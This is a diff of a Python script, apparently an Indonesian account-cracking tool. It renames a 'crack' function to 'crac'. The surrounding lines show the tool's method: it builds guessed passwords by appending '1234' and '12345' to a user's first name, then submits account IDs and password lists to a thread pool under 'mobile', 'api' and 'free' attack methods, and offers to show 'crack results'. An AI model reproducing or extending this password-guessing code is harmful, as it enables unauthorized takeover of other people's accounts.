@@ -381,13 +381,13 @@ def passwrd():
                         pwv.append(frs+'1234')
                         pwv.append(frs+'12345')
                         if 'mobile' in method:
-                            pool.submit(crack,idf,pwv)
+                            pool.submit(crac,idf,pwv)
                         elif 'api' in method:
                             pool.submit(crack2,idf,pwv)
                         elif 'free' in method:
                             pool.submit(crack3,idf,pwv)
                         else:
-                            pool.submit(crack,idf,pwv)
+                            pool.submit(crac,idf,pwv)
                             print('')
                             tanya = '# INGIN MENGECEK OPSI HASIL CRACK?'
                             sol().print(mark(tanya, style='cyan'))
@@ -398,7 +398,7 @@ def passwrd():
                                 exit()
 
     
-def crack(idf,pwv):
+def crac(idf,pwv):
     global loop,ok,cp
     bi = random.choice([u,k,kk,b,h,hh])
     pers = loop*100/len(id2)
